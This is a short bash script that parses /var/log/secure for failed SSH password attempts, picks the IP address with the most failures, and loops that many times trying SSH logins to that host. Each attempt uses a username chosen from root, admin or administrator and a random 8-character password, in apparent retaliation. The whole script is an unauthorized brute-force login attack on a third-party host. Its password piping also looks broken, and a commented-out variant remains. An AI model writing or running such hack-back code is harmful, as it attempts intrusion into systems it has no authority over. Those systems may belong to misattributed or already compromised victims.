#!/bin/bash

> /home/bill/Backups/denylog.txt
sudo less /var/log/secure | grep "Failed\ password\ for" | grep -o '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' > /home/bill/Backups/hitters.txt
less /home/bill/Backups/hitters.txt | sort -n | uniq -c | sort -n > /home/bill/Backups/targets.txt
n=$(tail -n 1 /home/bill/Backups/targets.txt | awk '{print $1}')
		for ((i=1; i<=$n; i++)); do
		LOGIN="$(shuf -e root admin administrator -n 1)";
		IPADDR="$(tail -n 1 /home/bill/Backups/targets.txt | awk '{print $2}')" 
		PASSWD="$(tr -dc [:alnum:] < /dev/urandom | head -c 8)";
		echo $PASSWD | ssh $LOGIN@$IPADDR
		### ssh -l $LOGIN $IPADDR "$PASSWD" >> /home/bill/Backups/denylog.txt 2>&1;
		done

exit 0
 
